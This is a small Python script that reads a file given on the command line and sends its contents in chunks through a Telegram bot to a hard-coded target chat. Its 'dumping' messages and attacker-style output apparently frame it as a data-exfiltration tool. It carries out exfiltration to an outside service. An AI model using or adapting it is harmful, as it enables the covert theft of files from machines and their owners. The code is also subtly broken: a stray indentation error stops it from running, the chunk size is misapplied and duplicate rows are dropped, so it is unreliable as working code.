import telegram, sys
from time import sleep

bot = telegram.Bot("TG TOKEN")
target = "TARGET ID - STRING or INT"

# Get raw updates from API:
def get_api_updates(): # -> list:
    print("Requesting Telegram updates.")
    return bot.getUpdates()

# Convert one update into json:
def parse_update(update) -> list:
    print("Parsing Telegram updates.")
    chatid = update.message.chat_id
    txt = update.message.text
    sender_id = update.message.from_user.id
    username = update.message.from_user.username
    return [chatid, txt, sender_id, username]

# Read file and send data over time:
 with open(sys.argv[1], 'r') as fl:
    chunk_size = 1000
    start_line = 1
    end_line = chunk_size
    rows = fl.readlines(chunk_size)
    # Start dumping:
    while rows:
        print(f'    Now dumping ... {start_line}/{end_line}')
        data = ""
        for row in rows:
            if row not in data:
                data += row + "\n"
        try:
            bot.sendMessage(target, data)
            sleep(3)
            # Update ranges:
        except Exception as err:
            print(str(err))
            sleep(10)
            continue            
        start_line = end_line + 1
        end_line += chunk_size
        rows = fl.readlines(chunk_size)

print("[*] Job done!")
